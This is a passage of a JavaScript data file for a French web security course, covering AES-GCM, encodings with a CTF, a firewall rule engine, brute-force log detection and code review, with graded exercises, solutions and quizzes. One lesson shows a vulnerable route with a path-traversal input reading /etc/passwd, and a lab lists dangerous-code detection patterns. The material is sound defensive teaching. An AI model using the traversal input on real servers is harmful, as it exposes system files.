<ul><li><strong>Ne jamais inventer sa cryptographie</strong> : utiliser des bibliothèques éprouvées (Web Crypto, libsodium, cryptography pour Python).</li><li>Préférer les API « haut niveau » qui choisissent les bons paramètres.</li><li>Les clés vivent dans des variables d'environnement ou un gestionnaire de secrets, jamais dans le code ou Git.</li><li>Chiffrement ≠ hachage ≠ encodage.</li></ul>
<div class="callout info"><b>Lab</b>Tu implémentes un petit coffre : dérivation de clé depuis un mot de passe, chiffrement AES-GCM avec nonce aléatoire, et détection d'altération.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Mini-coffre AES-GCM',
            enonce: `<p>Écris <code>async function deriverCle(motDePasse, sel)</code> (PBKDF2-SHA-256, 100 000 itérations pour la rapidité du lab, clé AES-GCM 256 bits), <code>async function chiffrer(cle, texte)</code> qui renvoie <code>{ iv, donnees }</code> (deux <code>Uint8Array</code>, iv de 12 octets aléatoires) et <code>async function dechiffrer(cle, iv, donnees)</code>. Dans <code>principal()</code> : dérive une clé, chiffre <code>"RDV 14h salle B"</code>, déchiffre (variable globale <code>resultat</code>), puis modifie un octet du chiffré et vérifie que le déchiffrement lève une erreur (variable globale <code>altere</code> = <code>true</code>).</p>`,
            depart: `async function deriverCle(motDePasse, sel) {
  // ...
}

async function chiffrer(cle, texte) {
  // ...
}

async function dechiffrer(cle, iv, donnees) {
  // ...
}

let resultat, altere = false, ivLongueur;
async function principal() {
  const sel = crypto.getRandomValues(new Uint8Array(16));
  const cle = await deriverCle("correct horse battery staple", sel);
  // ...
  console.log(resultat, altere);
}
principal();
`,
            solution: `async function deriverCle(motDePasse, sel) {
  const materiau = await crypto.subtle.importKey("raw", new TextEncoder().encode(motDePasse), "PBKDF2", false, ["deriveKey"]);
  return crypto.subtle.deriveKey(
    { name: "PBKDF2", salt: sel, iterations: 100000, hash: "SHA-256" },
    materiau, { name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);
}

async function chiffrer(cle, texte) {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const buffer = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, cle, new TextEncoder().encode(texte));
  return { iv, donnees: new Uint8Array(buffer) };
}

async function dechiffrer(cle, iv, donnees) {
  const buffer = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, cle, donnees);
  return new TextDecoder().decode(buffer);
}

let resultat, altere = false, ivLongueur;
async function principal() {
  const sel = crypto.getRandomValues(new Uint8Array(16));
  const cle = await deriverCle("correct horse battery staple", sel);
  const { iv, donnees } = await chiffrer(cle, "RDV 14h salle B");
  ivLongueur = iv.length;
  resultat = await dechiffrer(cle, iv, donnees);
  const corrompu = new Uint8Array(donnees);
  corrompu[0] ^= 0xff;
  try {
    await dechiffrer(cle, iv, corrompu);
  } catch (e) {
    altere = true;
  }
  console.log(resultat, altere);
}
principal();`,
            tests: [sansErreur(), expr('resultat', 'RDV 14h salle B'), expr('altere', true, 'AES-GCM doit refuser (exception) un chiffré altéré : attrape l\'erreur et mets altere à true.'), expr('ivLongueur', 12, 'Le nonce AES-GCM fait 12 octets.'), codeContient('PBKDF2', 'Dérive la clé avec PBKDF2.'), codeContient('AES-GCM', 'Utilise le mode authentifié AES-GCM.'), codeRegex(/getRandomValues\(new Uint8Array\(12\)\)/, 'IV aléatoire de 12 octets', 'Génère l\'iv avec crypto.getRandomValues(new Uint8Array(12)).'), codeContient('crypto.subtle.encrypt'), codeContient('crypto.subtle.decrypt')]
          },
          quiz: [
            { q: 'Pourquoi le nonce (IV) doit-il être unique pour chaque message ?', options: ['Pour la compression', 'La réutilisation avec la même clé casse la confidentialité et l\'authentification en GCM', 'Pour accélérer le déchiffrement'], bonne: 1, explication: 'Un nonce aléatoire de 12 octets par message suffit ; il se transmet en clair.' },
            { q: 'Avec quelle clé signe-t-on un document ?', options: ['La clé publique du destinataire', 'Sa propre clé privée', 'Une clé AES'], bonne: 1, explication: 'N\'importe qui vérifie ensuite avec la clé publique de l\'auteur.' },
            { q: 'Pourquoi ne pas utiliser directement un mot de passe comme clé AES ?', options: ['AES refuse les chaînes', 'Il est trop court et non uniforme : on le dérive avec PBKDF2/Argon2 et un sel', 'C\'est plus lent'], bonne: 1, explication: 'La dérivation lente résiste aussi à la force brute sur le mot de passe.' }
          ]
        },
        {
          titre: 'Encodages : base64, hexadécimal et URL',
          theorie: `<p>Un <strong>encodage</strong> transforme des données pour les transporter (texte dans une URL, binaire dans du JSON). Il est <em>réversible sans clé</em> : ce n'est <strong>pas</strong> de la sécurité. Confondre encodage et chiffrement est une erreur classique ; savoir décoder est une compétence de base en analyse et en CTF.</p>
<h2>Les encodages courants</h2>
<table><tr><th>Encodage</th><th>Reconnaissable à</th><th>Outil</th></tr>
<tr><td>Hexadécimal</td><td><code>0-9a-f</code>, longueur paire : <code>48656c6c6f</code></td><td><code>parseInt(h, 16)</code></td></tr>
<tr><td>Base64</td><td><code>A-Za-z0-9+/</code>, <code>=</code> final : <code>SGVsbG8=</code></td><td><code>atob</code>/<code>btoa</code></td></tr>
<tr><td>Base64url</td><td>idem avec <code>-_</code>, sans <code>=</code></td><td>remplacer puis <code>atob</code></td></tr>
<tr><td>URL (percent-encoding)</td><td><code>%20</code>, <code>%3C</code></td><td><code>decodeURIComponent</code></td></tr>
<tr><td>ROT13 / César</td><td>texte « presque » lisible</td><td>décalage de lettres</td></tr>
<tr><td>Binaire</td><td><code>01001000</code></td><td><code>parseInt(b, 2)</code></td></tr></table>
${code('javascript', `btoa("Lumio")                       // "THVtaW8="
atob("THVtaW8=")                    // "Lumio"
[..."Hi"].map(c => c.charCodeAt(0).toString(16).padStart(2, "0")).join("")   // "4869"
"4869".match(/../g).map(h => String.fromCharCode(parseInt(h, 16))).join("")  // "Hi"
decodeURIComponent("a%20b")          // "a b"`)}
<h2>Pourquoi c'est important en défense</h2>
<ul><li><strong>Contournement de filtres</strong> : un filtre qui bloque un motif en clair laisse parfois passer sa version encodée si l'application décode après le filtre. Règle : <em>décoder d'abord, valider ensuite, une seule fois</em>.</li><li><strong>Jetons</strong> : beaucoup de jetons se lisent en base64url ; une « clé encodée en base64 » dans une configuration est en clair.</li><li><strong>Analyse de contenu suspect</strong> : les charges sont souvent empilées (base64 d'hex de données compressées) ; les outils comme CyberChef enchaînent les décodages.</li></ul>
<h2>Repérer un encodage</h2>
<ol><li>Alphabet utilisé et caractères finaux (<code>=</code>).</li><li>Longueur (multiple de 4 pour base64, paire pour hex).</li><li>Entropie : du texte encodé reste structuré ; du chiffré paraît aléatoire.</li><li>Essayer, et itérer : le résultat est-il lui-même encodé ?</li></ol>
<div class="callout warn"><b>Base64 n'est pas du chiffrement</b>Si tu vois « mot de passe encodé en base64 » dans une configuration, considère-le comme en clair.</div>`,
          exercice: {
            type: 'texte', titre: 'Mini-CTF : décoder en cascade',
            enonce: `<p>Un message a été encodé trois fois de suite. Retrouve le drapeau : <code>NTM1OTRlNTQ3YjQ1NGU0MzRmNDQ0OTRlNDc1ZjQ5NTM1ZjVmNmU2Zjc0NWY1ZjYzNzI3OTcwNzQ3ZA==</code>. Indices : le premier décodage (base64) donne de l'hexadécimal ; converti en caractères il donne un texte en ROT13 au format <code>SYNT{…}</code>. Décale les lettres de 13 pour obtenir <code>FLAG{…}</code>. Utilise la console du navigateur ou l'éditeur JavaScript d'une autre leçon.</p>`,
            placeholder: 'FLAG{...}',
            verif: t => {
              const r = t.trim();
              if (r === 'FLAG{ENCODING_IS_NOT_CRYPTO}') return true;
              if (/^SYNT\{/i.test(r)) return 'Tu as le ROT13 : décale chaque lettre de 13 positions pour obtenir FLAG{...}.';
              if (/^[0-9a-f]+$/i.test(r)) return 'Ceci est de l\'hexadécimal : convertis chaque paire en caractère.';
              return 'Ce n\'est pas le drapeau. Décode base64 → hexadécimal → ROT13.';
            },
            solution: `<p><code>atob("NTM1OTRlNTQ3YjQ1...")</code> donne une suite hexadécimale ; chaque paire convertie en caractère donne <code>SYNT{RAPBQVAT_VF_ABG_PELCG}</code> (ROT13) ; en décalant de 13 : <code>FLAG{ENCODING_IS_NOT_CRYPTO}</code>.</p>`,
            explication: 'Trois encodages empilés, zéro cryptographie. Un filtre qui n\'examine pas le contenu décodé ne voit rien.'
          },
          quiz: [
            { q: 'Base64 protège-t-il la confidentialité ?', options: ['Oui, sans la clé on ne peut pas lire', 'Non : c\'est un encodage réversible sans clé', 'Seulement en base64url'], bonne: 1, explication: 'atob() suffit à lire le contenu.' },
            { q: 'Dans quel ordre traiter une entrée encodée ?', options: ['Valider puis décoder', 'Décoder une fois, puis valider', 'Décoder plusieurs fois par sécurité'], bonne: 1, explication: 'Valider avant de décoder laisse passer les charges encodées ; décoder plusieurs fois crée des contournements.' },
            { q: 'Comment reconnaître du base64 ?', options: ['Caractères 0-9 et a-f seulement', 'Alphabet A-Z a-z 0-9 + / avec = en fin, longueur multiple de 4', 'Des % suivis de deux chiffres'], bonne: 1, explication: 'L\'hexadécimal n\'utilise que 16 symboles ; le percent-encoding utilise %.' }
          ]
        },
        {
          titre: 'Réseau : ports, pare-feu, DNS et VPN',
          theorie: `<p>Un serveur expose des services sur des <strong>ports</strong>, résout des noms via <strong>DNS</strong>, et chaque paquet traverse des équipements. Comprendre cette couche permet de réduire la surface d'attaque et de lire une alerte.</p>
<h2>Ports et services</h2>
<table><tr><th>Port</th><th>Service</th><th>Note</th></tr>
<tr><td>22</td><td>SSH</td><td>administration ; clés + MFA, jamais de mot de passe root</td></tr>
<tr><td>80 / 443</td><td>HTTP / HTTPS</td><td>80 ne devrait que rediriger vers 443</td></tr>
<tr><td>53</td><td>DNS</td><td>UDP et TCP</td></tr>
<tr><td>3306 / 5432</td><td>MySQL / PostgreSQL</td><td>ne doivent JAMAIS être exposés sur Internet</td></tr>
<tr><td>6379 / 27017</td><td>Redis / MongoDB</td><td>idem ; des milliers de bases ouvertes sont pillées chaque année</td></tr>
<tr><td>3389</td><td>RDP</td><td>vecteur majeur de rançongiciels : derrière un VPN uniquement</td></tr></table>
<p><code>ss -tlnp</code> liste les ports en écoute sur ta machine. Un service dont tu ignorais l'existence est un risque.</p>
<h2>Pare-feu</h2>
<p>Principe : <strong>tout bloquer en entrée, ouvrir le strict nécessaire</strong>. Sur un serveur web : 22 (depuis ton IP ou via VPN), 80, 443. C'est tout. Outils : <code>ufw</code> (<code>ufw default deny incoming; ufw allow 443/tcp</code>), <code>nftables</code>, les groupes de sécurité cloud. <code>fail2ban</code> bannit les IP qui échouent répétitivement.</p>
<h2>DNS</h2>
<p>Traduit <code>exemple.fr</code> en adresse IP. Risques : empoisonnement de cache, typosquatting (<code>exemp1e.fr</code>), détournement de domaine. Protections : DNSSEC, DNS over HTTPS/TLS, MFA chez le registrar, surveillance des enregistrements. Enregistrements à connaître : A/AAAA (adresse), CNAME (alias), MX (mail), TXT (SPF, DKIM, DMARC : authentification des emails, indispensable contre l'usurpation de ton domaine).</p>
<h2>Attaques réseau classiques</h2>
<ul><li><strong>Homme du milieu</strong> (MITM) : interception sur un Wi-Fi public. Parade : HTTPS/HSTS partout, VPN.</li><li><strong>DDoS</strong> : saturer un service. Parade : CDN/anti-DDoS, rate limiting, scalabilité.</li><li><strong>Scan et force brute</strong> : bruit permanent d'Internet. Parade : pare-feu, fail2ban, clés SSH.</li></ul>
<h2>VPN, Zero Trust et segmentation</h2>
<p>Un VPN chiffre le trafic jusqu'à un point de sortie : utile sur un réseau hostile ou pour atteindre un réseau privé. Il ne rend pas anonyme et ne protège pas d'un site malveillant. L'approche <em>Zero Trust</em> ne fait plus confiance au réseau interne : chaque accès est authentifié et autorisé individuellement. Séparer les réseaux (invités, bureautique, serveurs, IoT) limite la propagation d'une compromission.</p>
<div class="callout info"><b>Lab</b>Tu écris un évaluateur de règles de pare-feu : étant donné des règles ordonnées et un paquet, quelle décision ? C'est l'algorithme d'iptables/nftables.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Moteur de règles de pare-feu',
            enonce: `<p>Écris <code>decider(regles, paquet)</code>. Un paquet est <code>{ ip, port, proto }</code>. Une règle est <code>{ action: "allow"|"deny", port?, proto?, source? }</code> où <code>source</code> est une IP exacte ou un préfixe CIDR simplifié <code>"10.0.0.0/8"</code>, <code>"192.168.1.0/24"</code> (gère /8, /16, /24 par comparaison des octets). Les règles sont évaluées <strong>dans l'ordre</strong> ; la première qui correspond décide ; sans correspondance, politique par défaut <code>"deny"</code>. Écris aussi <code>correspondIP(ip, source)</code>.</p>`,
            depart: `const regles = [
  { action: "allow", port: 22, proto: "tcp", source: "203.0.113.0/24" },
  { action: "deny", port: 22 },
  { action: "allow", port: 443, proto: "tcp" },
  { action: "allow", port: 80, proto: "tcp" },
  { action: "deny", source: "198.51.100.7" },
];

function correspondIP(ip, source) {
  // ...
}

function decider(regles, paquet) {
  // ...
}

console.log(decider(regles, { ip: "203.0.113.9", port: 22, proto: "tcp" }));
console.log(decider(regles, { ip: "8.8.8.8", port: 22, proto: "tcp" }));
console.log(decider(regles, { ip: "8.8.8.8", port: 3306, proto: "tcp" }));
`,
            solution: `const regles = [
  { action: "allow", port: 22, proto: "tcp", source: "203.0.113.0/24" },
  { action: "deny", port: 22 },
  { action: "allow", port: 443, proto: "tcp" },
  { action: "allow", port: 80, proto: "tcp" },
  { action: "deny", source: "198.51.100.7" },
];

function correspondIP(ip, source) {
  const [reseau, masque] = source.split("/");
  const a = ip.split(".").map(Number), b = reseau.split(".").map(Number);
  const octets = masque === undefined ? 4 : Number(masque) / 8;
  for (let i = 0; i < octets; i++) {
    if (a[i] !== b[i]) return false;
  }
  return true;
}

function decider(regles, paquet) {
  for (const r of regles) {
    if (r.port !== undefined && r.port !== paquet.port) continue;
    if (r.proto !== undefined && r.proto !== paquet.proto) continue;
    if (r.source !== undefined && !correspondIP(paquet.ip, r.source)) continue;
    return r.action;
  }
  return "deny";
}

console.log(decider(regles, { ip: "203.0.113.9", port: 22, proto: "tcp" }));
console.log(decider(regles, { ip: "8.8.8.8", port: 22, proto: "tcp" }));
console.log(decider(regles, { ip: "8.8.8.8", port: 3306, proto: "tcp" }));`,
            tests: [sansErreur(), expr('correspondIP("10.1.2.3", "10.0.0.0/8")', true), expr('correspondIP("11.1.2.3", "10.0.0.0/8")', false), expr('correspondIP("192.168.1.77", "192.168.1.0/24")', true), expr('correspondIP("192.168.2.1", "192.168.1.0/24")', false), expr('correspondIP("1.2.3.4", "1.2.3.4")', true), expr('decider(regles, { ip: "203.0.113.9", port: 22, proto: "tcp" })', 'allow'), expr('decider(regles, { ip: "8.8.8.8", port: 22, proto: "tcp" })', 'deny'), expr('decider(regles, { ip: "8.8.8.8", port: 443, proto: "tcp" })', 'allow'), expr('decider(regles, { ip: "8.8.8.8", port: 443, proto: "udp" })', 'deny', 'Le protocole fait partie des critères.'), expr('decider(regles, { ip: "8.8.8.8", port: 3306, proto: "tcp" })', 'deny'), expr('decider(regles, { ip: "198.51.100.7", port: 80, proto: "tcp" })', 'allow', 'L\'ordre compte : la règle allow 80 précède le deny de cette IP.'), expr('decider([], { ip: "1.1.1.1", port: 80, proto: "tcp" })', 'deny')]
          },
          quiz: [
            { q: 'Quelle politique par défaut pour un pare-feu en entrée ?', options: ['Tout autoriser puis bloquer le connu', 'Tout bloquer puis ouvrir le nécessaire', 'Ne rien configurer'], bonne: 1, explication: 'Refus par défaut : un nouveau service n\'est pas exposé par accident.' },
            { q: 'Une base PostgreSQL doit-elle être accessible depuis Internet ?', options: ['Oui, avec un bon mot de passe', 'Non : uniquement depuis l\'application ou via VPN', 'Oui sur un port non standard'], bonne: 1, explication: 'Les bases exposées sont scannées et attaquées en continu.' },
            { q: 'Que garantit un VPN grand public ?', options: ['L\'anonymat total', 'Le chiffrement du trafic jusqu\'au point de sortie', 'La protection contre les sites malveillants'], bonne: 1, explication: 'Utile sur un Wi-Fi public ; ne remplace ni HTTPS ni la prudence.' }
          ]
        },
        {
          titre: 'Journaux, détection et réponse à incident',
          theorie: `<p>On ne défend pas ce qu'on ne voit pas. Les <strong>journaux</strong> (logs) sont la mémoire du système : qui s'est connecté, d'où, avec quel résultat. Les lire et les analyser permet de détecter une attaque en cours et de comprendre un incident après coup.</p>
<h2>Quoi journaliser</h2>
<ul><li>Authentification : succès et échecs, avec IP, horodatage, compte visé (jamais le mot de passe).</li><li>Autorisation : accès refusés (403), élévations de privilège.</li><li>Actions sensibles : changement de mot de passe/email, export de données, suppression.</li><li>Erreurs applicatives et requêtes anormales.</li><li>Système : <code>sshd</code>, <code>sudo</code>, pare-feu, cron.</li></ul>
<p>Format structuré, horodatage UTC ISO 8601, identifiant de requête pour corréler. Pas de données personnelles inutiles ni de secrets dans les logs (RGPD et sécurité).</p>
<h2>Détecter</h2>
<table><tr><th>Signal</th><th>Interprétation</th></tr>
<tr><td>Dizaines de 401 depuis une IP en une minute</td><td>force brute</td></tr>
<tr><td>401 sur de nombreux comptes différents, peu de tentatives chacun</td><td>password spraying</td></tr>
<tr><td>Connexion réussie après une rafale d'échecs</td><td>compromission probable : vérifier immédiatement</td></tr>
<tr><td>403 sur des identifiants successifs</td><td>énumération (IDOR)</td></tr>
<tr><td>Connexion d'un compte depuis deux pays en une heure</td><td>session volée (« voyage impossible »)</td></tr>
<tr><td>Trafic sortant inhabituel la nuit</td><td>exfiltration</td></tr></table>
<p>Outils : <code>grep</code>/<code>awk</code> pour commencer ; <code>fail2ban</code> pour réagir ; une pile de centralisation (Loki, ELK, Graylog) ; un SIEM (Wazuh, Splunk) pour corréler et alerter.</p>
<h2>Répondre à un incident</h2>
<ol><li><strong>Préparer</strong> : contacts, sauvegardes testées, procédure écrite, journaux conservés hors de la machine.</li><li><strong>Identifier</strong> : quoi, depuis quand, comment ? Préserver les preuves.</li><li><strong>Contenir</strong> : isoler la machine (pas éteindre : la mémoire contient des indices), révoquer les sessions et clés.</li><li><strong>Éradiquer</strong> : corriger la faille, réinstaller plutôt que nettoyer, changer tous les secrets.</li><li><strong>Restaurer</strong> depuis des sauvegardes saines, surveiller de près.</li><li><strong>Tirer les leçons</strong> : post-mortem sans blâme. Notifier la CNIL sous 72 h en cas de fuite de données personnelles.</li></ol>
<div class="callout info"><b>Lab</b>Tu écris un détecteur de force brute et de password spraying sur des lignes de journal : le cœur d'un fail2ban.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Détecter la force brute dans les logs',
            enonce: `<p>Écris <code>parserLigne(ligne)</code> qui extrait <code>{ ip, minute, chemin, statut, utilisateur }</code> d'une ligne au format <code>IP [HH:MM] METHODE /chemin STATUT user=NOM</code> (<code>statut</code> numérique). Puis <code>detecter(lignes)</code> qui renvoie <code>{ forceBrute: [ips], spraying: [ips], compromis: [ips] }</code> : <code>forceBrute</code> = IP avec ≥ 5 statuts 401 sur <code>/login</code> dans la même minute ; <code>spraying</code> = IP avec des 401 sur ≥ 3 utilisateurs différents ; <code>compromis</code> = IP ayant un 200 sur <code>/login</code> <em>après</em> au moins 3 échecs 401. Listes triées, sans doublon.</p>`,
            depart: `const journal = \`203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:04] POST /login 200 user=ana
198.51.100.7 [14:10] POST /login 401 user=bob
198.51.100.7 [14:12] POST /login 401 user=chloe
198.51.100.7 [14:15] POST /login 401 user=dan
192.0.2.4 [15:00] GET /compte 200 user=eva
192.0.2.4 [15:01] POST /login 401 user=eva
192.0.2.4 [15:02] POST /login 200 user=eva\`.split("\\n");

function parserLigne(ligne) {
  // ...
}

function detecter(lignes) {
  // ...
}

console.log(detecter(journal));
`,
            solution: `const journal = \`203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:03] POST /login 401 user=ana
203.0.113.9 [14:04] POST /login 200 user=ana
198.51.100.7 [14:10] POST /login 401 user=bob
198.51.100.7 [14:12] POST /login 401 user=chloe
198.51.100.7 [14:15] POST /login 401 user=dan
192.0.2.4 [15:00] GET /compte 200 user=eva
192.0.2.4 [15:01] POST /login 401 user=eva
192.0.2.4 [15:02] POST /login 200 user=eva\`.split("\\n");

function parserLigne(ligne) {
  const m = ligne.match(/^(\\S+) \\[(\\d\\d:\\d\\d)\\] (\\S+) (\\S+) (\\d{3}) user=(\\S+)$/);
  if (!m) return null;
  return { ip: m[1], minute: m[2], chemin: m[4], statut: Number(m[5]), utilisateur: m[6] };
}

function detecter(lignes) {
  const entrees = lignes.map(parserLigne).filter(Boolean);
  const parMinute = {}, utilisateurs = {}, echecs = {};
  const forceBrute = new Set(), spraying = new Set(), compromis = new Set();
  for (const e of entrees) {
    if (e.chemin !== "/login") continue;
    if (e.statut === 401) {
      const cle = e.ip + "|" + e.minute;
      parMinute[cle] = (parMinute[cle] ?? 0) + 1;
      if (parMinute[cle] >= 5) forceBrute.add(e.ip);
      (utilisateurs[e.ip] ??= new Set()).add(e.utilisateur);
      if (utilisateurs[e.ip].size >= 3) spraying.add(e.ip);
      echecs[e.ip] = (echecs[e.ip] ?? 0) + 1;
    } else if (e.statut === 200) {
      if ((echecs[e.ip] ?? 0) >= 3) compromis.add(e.ip);
    }
  }
  const tri = s => [...s].sort();
  return { forceBrute: tri(forceBrute), spraying: tri(spraying), compromis: tri(compromis) };
}

console.log(detecter(journal));`,
            tests: [sansErreur(), expr('parserLigne("203.0.113.9 [14:03] POST /login 401 user=ana")', { ip: '203.0.113.9', minute: '14:03', chemin: '/login', statut: 401, utilisateur: 'ana' }), expr('detecter(journal)', { forceBrute: ['203.0.113.9'], spraying: ['198.51.100.7'], compromis: ['203.0.113.9'] }), expr('detecter(["1.1.1.1 [10:00] POST /login 401 user=a", "1.1.1.1 [10:01] POST /login 401 user=a", "1.1.1.1 [10:02] POST /login 401 user=a", "1.1.1.1 [10:03] POST /login 401 user=a", "1.1.1.1 [10:04] POST /login 401 user=a"]).forceBrute', [], 'Cinq échecs sur cinq minutes différentes ne constituent pas une force brute « dans la même minute ».'), expr('detecter(["2.2.2.2 [10:00] POST /login 200 user=a", "2.2.2.2 [10:01] POST /login 401 user=a", "2.2.2.2 [10:01] POST /login 401 user=a", "2.2.2.2 [10:01] POST /login 401 user=a"]).compromis', [], 'Le 200 doit survenir APRÈS les échecs.'), expr('detecter(["3.3.3.3 [10:00] POST /login 401 user=x", "3.3.3.3 [10:00] POST /login 401 user=y", "3.3.3.3 [10:00] POST /login 401 user=z", "3.3.3.3 [10:00] POST /login 401 user=z", "3.3.3.3 [10:00] POST /login 401 user=z"])', { forceBrute: ['3.3.3.3'], spraying: ['3.3.3.3'], compromis: [] })]
          },
          quiz: [
            { q: 'Que suggère une connexion réussie juste après une rafale d\'échecs ?', options: ['Un utilisateur distrait', 'Une compromission probable à vérifier immédiatement', 'Rien de particulier'], bonne: 1, explication: 'C\'est le motif typique d\'une force brute aboutie.' },
            { q: 'Pourquoi conserver les journaux hors de la machine ?', options: ['Pour gagner de l\'espace', 'Pour qu\'un attaquant ne puisse pas effacer ses traces', 'Pour le RGPD'], bonne: 1, explication: 'Centralisation en écriture seule : intégrité des preuves.' },
            { q: 'Première action face à une machine compromise ?', options: ['L\'éteindre immédiatement', 'L\'isoler du réseau en préservant les preuves', 'Supprimer les fichiers suspects'], bonne: 1, explication: 'Éteindre perd la mémoire vive ; nettoyer détruit les indices. Isoler puis analyser.' }
          ]
        }
      ]
    },
    {
      titre: 'Mise en pratique', niveau: 'Avancé', description: 'Revue de code sécurisée, audit d\'application, développement défensif et éthique.',
      lecons: [
        {
          titre: 'Revue de code : repérer les failles',
          theorie: `<p>La compétence la plus rentable en sécurité applicative : lire un bout de code et voir la faille avant l'attaquant. Cette leçon rassemble les failles du parcours sous forme de revue de code. La méthode : suivre la donnée depuis l'entrée utilisateur jusqu'à chaque « point de sortie » dangereux (base de données, HTML, système de fichiers, commande système, réponse HTTP).</p>
<h2>Les points de sortie dangereux</h2>
<table><tr><th>La donnée arrive dans…</th><th>Faille possible</th><th>Parade</th></tr>
<tr><td>une requête SQL</td><td>injection SQL</td><td>requête paramétrée</td></tr>
<tr><td>du HTML</td><td>XSS</td><td>échappement à la sortie</td></tr>
<tr><td>une commande shell</td><td>injection de commande</td><td>API sans shell, liste d'arguments</td></tr>
<tr><td>un chemin de fichier</td><td>traversée de répertoire</td><td>nom généré, pas de <code>..</code></td></tr>
<tr><td>une redirection</td><td>open redirect</td><td>liste blanche d'URL</td></tr>
<tr><td>une désérialisation</td><td>exécution de code</td><td>formats sûrs (JSON), schéma</td></tr></table>
<h2>Exemple commenté</h2>
${code('python', `@app.route("/avatar")
def avatar():
    nom = request.args.get("fichier")                    # ENTRÉE utilisateur
    chemin = "/var/www/avatars/" + nom                   # ① traversée : ?fichier=../../etc/passwd
    return send_file(chemin)                             # SORTIE fichier

# Version corrigée
import os
@app.route("/avatar")
def avatar():
    nom = request.args.get("fichier", "")
    if not re.fullmatch(r"[a-zA-Z0-9_-]+\\.png", nom):    # liste blanche stricte
        abort(400)
    chemin = os.path.join("/var/www/avatars", nom)
    chemin = os.path.realpath(chemin)
    if not chemin.startswith("/var/www/avatars/"):       # vérifie qu'on reste dans le dossier
        abort(400)
    return send_file(chemin)`)}
<h2>Les signaux d'alerte à l'œil</h2>
<ul><li>Concaténation de chaînes pour construire une requête, une commande, du HTML, un chemin.</li><li><code>eval</code>, <code>exec</code>, <code>pickle.loads</code>, <code>os.system</code>, <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>render_template_string</code>.</li><li>Un contrôle d'accès absent : une route qui lit une ressource par identifiant sans vérifier le propriétaire.</li><li>Un secret en dur (<code>API_KEY = "sk_live_..."</code>), un mot de passe haché en SHA-256 sans sel, <code>verify=False</code> sur une requête TLS.</li><li>Une validation côté client seulement, un <code>TODO: sanitize</code>, un <code>catch</code> vide.</li></ul>
<h2>Automatiser</h2>
<p>Les outils d'<strong>analyse statique</strong> (SAST) lisent le code sans l'exécuter : Semgrep (règles lisibles), Bandit (Python), CodeQL, ESLint avec plugins sécurité. Les scanners de <strong>dépendances</strong> (<code>npm audit</code>, <code>pip-audit</code>, Dependabot, Trivy) repèrent les bibliothèques vulnérables — souvent la vraie porte d'entrée. Les scanners <strong>dynamiques</strong> (DAST, OWASP ZAP) testent l'application en marche. Aucun ne remplace la revue humaine, mais ils attrapent l'évident à grande échelle, dans la CI.</p>
<div class="callout info"><b>Lab</b>Tu écris un mini-analyseur statique qui signale des motifs dangereux dans du code, comme le ferait une règle Semgrep.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Mini-analyseur statique',
            enonce: `<p>Écris <code>analyser(code)</code> qui renvoie un tableau de <code>{ ligne, severite, message }</code> (numéros de ligne à partir de 1) en détectant : concaténation dans une requête SQL (une chaîne contenant <code>SELECT</code>/<code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code> suivie d'un <code>+</code>) → <code>"haute"</code>, « injection SQL possible » ; usage de <code>innerHTML =</code> → <code>"haute"</code>, « XSS possible (innerHTML) » ; appel à <code>eval(</code> ou <code>exec(</code> → <code>"haute"</code>, « exécution dynamique » ; un secret en dur (affectation d'une chaîne à une variable dont le nom contient <code>password</code>, <code>secret</code>, <code>api_key</code> ou <code>token</code>, insensible à la casse) → <code>"moyenne"</code>, « secret en dur » ; <code>verify: false</code> ou <code>rejectUnauthorized: false</code> → <code>"moyenne"</code>, « vérification TLS désactivée ». Trie par numéro de ligne.</p>`,
            depart: `const code = \`const q = "SELECT * FROM users WHERE id = " + id;
element.innerHTML = commentaire;
const API_KEY = "sk_live_123456";
fetch(url, { verify: false });
eval(entree);
const total = a + b;\`;

function analyser(code) {
  // ...
}

console.log(analyser(code));
`,
            solution: `const code = \`const q = "SELECT * FROM users WHERE id = " + id;
element.innerHTML = commentaire;
const API_KEY = "sk_live_123456";
fetch(url, { verify: false });
eval(entree);
const total = a + b;\`;

function analyser(code) {
  const lignes = code.split("\\n");
  const trouvailles = [];
  lignes.forEach((l, i) => {
    const n = i + 1;
    if (/["'][^"']*\\b(SELECT|INSERT|UPDATE|DELETE)\\b[^"']*["']\\s*\\+/i.test(l))
      trouvailles.push({ ligne: n, severite: "haute", message: "injection SQL possible" });
    if (/\\binnerHTML\\s*=/.test(l))
      trouvailles.push({ ligne: n, severite: "haute", message: "XSS possible (innerHTML)" });
    if (/\\b(eval|exec)\\s*\\(/.test(l))
      trouvailles.push({ ligne: n, severite: "haute", message: "exécution dynamique" });
    if (/\\b\\w*(password|secret|api_?key|token)\\w*\\s*=\\s*["'][^"']+["']/i.test(l))
      trouvailles.push({ ligne: n, severite: "moyenne", message: "secret en dur" });
    if (/(verify|rejectUnauthorized)\\s*:\\s*false/.test(l))
      trouvailles.push({ ligne: n, severite: "moyenne", message: "vérification TLS désactivée" });
  });
  return trouvailles.sort((a, b) => a.ligne - b.ligne);
}

console.log(analyser(code));`,
